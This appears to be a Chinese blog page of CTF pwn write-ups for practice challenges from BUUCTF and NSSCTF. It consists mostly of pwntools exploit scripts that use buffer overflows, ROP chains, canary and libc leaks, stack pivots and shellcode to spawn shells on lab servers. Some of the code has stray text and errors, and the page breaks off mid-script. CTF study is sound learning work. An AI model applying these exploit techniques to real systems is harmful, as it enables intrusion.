<h2 id="2021-鹤城杯-easyecho"><a href="#2021-鹤城杯-easyecho" class="headerlink" title="[2021 鹤城杯]easyecho"></a>[2021 鹤城杯]easyecho</h2><p>[<a href="https://blog.csdn.net/woodwhale/article/details/120680661">https://blog.csdn.net/woodwhale/article/details/120680661</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./easyecho&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28947</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name:&quot;</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">15</span>+<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">addr =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr&quot;</span>,addr)]()</span><br><span class="line"></span><br><span class="line">flag_addr =addr + <span class="number">0x202040</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag_addr&quot;</span>,flag_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x168</span> + p64(flag_addr)</span><br><span class="line"> <span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>,<span class="string">&quot;backdoor&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: &#x27;</span>,<span class="string">&#x27;exitexit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()、</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-ezpie"><a href="#NISACTF-2022-ezpie" class="headerlink" title="[NISACTF 2022]ezpie"></a>[NISACTF 2022]ezpie</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PIE保护机制只随机初始基地址，函数之间的偏移不会变</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28123</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>) </span><br><span class="line">计算偏移量</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line">shell_addr=elf.symbols[<span class="string">&#x27;shell&#x27;</span>] </span><br><span class="line">offest=shell_addr-main_addr</span><br><span class="line">log.info(<span class="string">&#x27;offest is :%x&#x27;</span>%offest) </span><br><span class="line">根据泄露的main函数地址计算shell函数地址</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;gift!\n0x&#x27;</span>) </span><br><span class="line">p_main_addr=<span class="built_in">int</span>(p.recv(<span class="number">8</span>).decode(),<span class="number">16</span>) </span><br><span class="line">p_shell_addr=p_main_addr+offest </span><br><span class="line">获得shell</span><br><span class="line">payload=flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>,p_shell_addr) </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="GFCTF-2021-where-is-shell"><a href="#GFCTF-2021-where-is-shell" class="headerlink" title="[GFCTF 2021]where_is_shell"></a>[GFCTF 2021]where_is_shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28720</span>)</span><br><span class="line">ret_addr = <span class="number">0x400416</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x4005e3</span> </span><br><span class="line">tips = <span class="number">0x400541</span><span class="comment">#可以利用system($0)获得shell权限，$0在机器码中为 \x24\x3，发现 24 30，查看操作码</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;find it?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26813</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400993</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]canary: &#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">沙盒</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27085</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">42</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">42</span>)</span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;shellcode:&quot;</span>,payload)</span><br><span class="line"><span class="comment">#print(r.recv())</span></span><br><span class="line">r.interactive() </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">打开flag文件，sys_open(file,0,0)；系统调用号为5</span></span><br><span class="line"><span class="string">push 0x0  			#字符串结尾</span></span><br><span class="line"><span class="string">push 0x67616c66		#&#x27;flags&#x27;</span></span><br><span class="line"><span class="string">mov ebx,esp			</span></span><br><span class="line"><span class="string">xor ecx,ecx			#0</span></span><br><span class="line"><span class="string">xor edx,edx			#0</span></span><br><span class="line"><span class="string">mov eax,0x5			#调用号</span></span><br><span class="line"><span class="string">int 0x80			#sys_open(flags,0,0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">读flag文件，sys_read(3,file,0x100)；系统调用号为3</span></span><br><span class="line"><span class="string">mov eax,0x3; </span></span><br><span class="line"><span class="string">mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line"><span class="string">mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span></span><br><span class="line"><span class="string">mov edx,0x100;	#对应字节数</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</span></span><br><span class="line"><span class="string">mov eax,0x4;	# eax = sys_write</span></span><br><span class="line"><span class="string">mov ebx,0x1;	# ebx = unsigned int fd = 1</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p><strong>checksec</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x308CD64F</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag</p>
<p>但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？</p>
<p>于是我们需要<code>exit()</code>的地址，以及满足条件的a1和a2的值，即<code>0x308CD64F</code>和<code>0x195719D1</code></p>
<p><strong>exp</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;i386&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27026</span>)</span><br><span class="line">ret = <span class="number">0x08048196</span></span><br><span class="line">exits = elf.sym[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;got exit addr : %s&quot;</span> % <span class="built_in">hex</span>(exits))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p32(<span class="number">0x080489A0</span>) + p32(exits) + p32(<span class="number">0x308CD64F</span>)+ p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Qual a palavrinha magica? &quot;</span> , timeout = <span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>先checksec一下，nx排除了shellcode的可能，Full RELEO为地址随机化</p>
<p>先观察主函数，设定了一个闹钟(但是这道题不需要使用解除闹钟的方法)</p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png"></p>
<p>主函数的思路是生成一个随机数，把这个随机数作为参数传进sub——804871F()函数中，然后再将函数返回结果作为参数传进sub——80487D0()里,sub_80486bb()是初始化，没什么用。<strong>fd&#x3D;open(“&#x2F;dev&#x2F;urandom”,0);if(fd&gt;0) read(fd,&amp;buf,4u)</strong>:获取一个随机数给到buf</p>
<p><strong>sub_804871f()</strong></p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png"></p>
<p>sprintf函数将生成的随机数加到s[32]的数组中，这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：<strong>使strncmp结果为0</strong></p>
<p><strong>sub_80487d0()</strong></p>
<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png"></p>
<p>这个函数将buf[7]作为参数出传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：<strong>使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</strong></p>
<p><strong>思路</strong></p>
<p>使用ROP链寻找libc解题</p>
<p>首先让strncmp结果为零，当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。另一种办法就是<strong>使v1等于0，这样strncmp的结果仍为0。</strong>而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，让buf数组的第一位为<strong>‘\x00’</strong>即可。此时程序不会退出</p>
<p>然后让buf[7]的值尽可能大，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行，所以要使用转义字符的ASCii码，’&#39;为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25352</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]<span class="string">&#x27;&#x27;&#x27;选择用write函数泄露libc地址&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_func = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&quot;\x00&quot;</span>长度检测绕过+ <span class="string">b&quot;\xff&quot;</span>*<span class="number">7</span>让buf[<span class="number">7</span>]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为<span class="number">255</span>的符号。</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xE7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,write_plt,main_func,<span class="number">1</span>,read_got,<span class="number">0x8</span>])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(read_addr)</span><br><span class="line">libcbase = read_addr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment">#print libcbase</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(binsh)</span><br><span class="line">payload3 = flat([<span class="string">b&quot;a&quot;</span>*<span class="number">0xe7</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">4</span>,system_addr,<span class="number">0</span>,binsh])</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure>





<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28787</span>)</span><br><span class="line">io = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">write_addr = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">exit_addr = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">这个main函数没有push ebp 所以不用再覆盖<span class="number">4</span>字节的ebp</span><br><span class="line">payload = <span class="number">0x2D</span> * <span class="string">b&#x27;a&#x27;</span> + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(<span class="number">1</span>) + p32(str_flag_addr) + p32(<span class="number">45</span>)<span class="comment">#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填</span></span><br><span class="line">payload += p32(<span class="number">1</span>)           <span class="comment"># write函数的第一个参数，是 文件描述符；</span></span><br><span class="line">payload += p32(flagaddr)    <span class="comment"># write函数的第二个参数，是 存放字符串的内存地址；</span></span><br><span class="line">payload += p32(<span class="number">42</span>)          <span class="comment"># write函数的第三个参数，是 打印字符串的长度</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>



<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25020</span>)</span><br><span class="line">main_addr      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_write_addr = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_write_addr = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload        = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(plt_write_addr) + p32(main_addr) + p32(<span class="number">1</span>) + p32(got_write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr     = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">lib             = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">lib_write_addr  = lib.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">base_addr       = write_addr - lib_write_addr</span><br><span class="line">system_addr     = base_addr  + lib_system_addr</span><br><span class="line">bin_addr 	= base_addr  + lib_bin_addr</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn8&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29794</span>)</span><br><span class="line">sys_addr=<span class="number">0x08048400</span></span><br><span class="line">leave_addr=<span class="number">0x8048562</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(ebp-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp-<span class="number">0x38</span>)看当时的ebp+p32(leave_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">整数溢出问题</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29476</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn9&#x27;</span>)</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">vuln=<span class="number">0x0804852f</span></span><br><span class="line">main=<span class="number">0x080485b8</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(printf_plt)+p32(vuln)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_add=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_add))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_add)</span><br><span class="line">libc_base=printf_add-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span 